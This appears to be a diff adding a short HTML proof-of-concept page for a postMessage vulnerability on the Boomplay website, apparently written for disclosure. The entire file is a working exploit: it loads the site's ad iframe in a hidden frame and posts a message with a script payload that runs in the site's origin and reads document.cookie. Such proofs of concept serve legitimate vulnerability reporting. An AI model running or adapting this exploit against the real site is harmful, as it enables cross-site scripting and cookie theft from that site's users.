@@ -1,1 +1,29 @@
-lol
+<html>
+
+<head>
+    <title>POC for Boomplay.com PostMessage vulnerability</title>
+</head>
+
+<body>
+    <script>
+        let boom = "https://www.boomplay.com/ad_iframe";
+        let frame = document.createElement("iframe");
+        frame.src = `${boom}`;
+        frame.style.display = "none";
+        frame.onload = () => {
+            frame.contentWindow.postMessage({
+                type: "ad_iframe",
+                data: {
+                    source: "BP",
+                    bpData: {
+                        scriptContent: { script: "<script>console.log(document.domain + \":\" + document.cookie);<\/script>" }
+                    },
+                    lmxType: "JSCode"
+                }
+            }, "*");
+        }
+        document.body.appendChild(frame);
+    </script>
+</body>
+
+</html>
